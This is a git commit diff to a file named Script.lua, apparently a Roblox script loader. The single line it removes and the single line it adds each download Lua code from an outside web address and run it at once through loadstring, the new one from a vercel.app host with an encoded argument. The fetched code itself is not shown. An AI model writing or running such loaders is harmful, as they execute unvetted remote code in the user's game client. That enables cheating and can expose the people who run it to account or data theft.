dbe74d4e8eead1176d99af66579a0670a9e8dddd
XenaScriptX <kenjieclark30@gmail.com>
2026-09-21 15:19:20 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3NTA2NmI2LWUyNDctNDZhZS05NjBhLWIyZjVhMjY0MDhjZCIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://test-nine-snowy-58.vercel.app/scripts/all_in_one.lua"))({"MTQ3NjE4OTQyODcyMzc0ODkzNQ"})
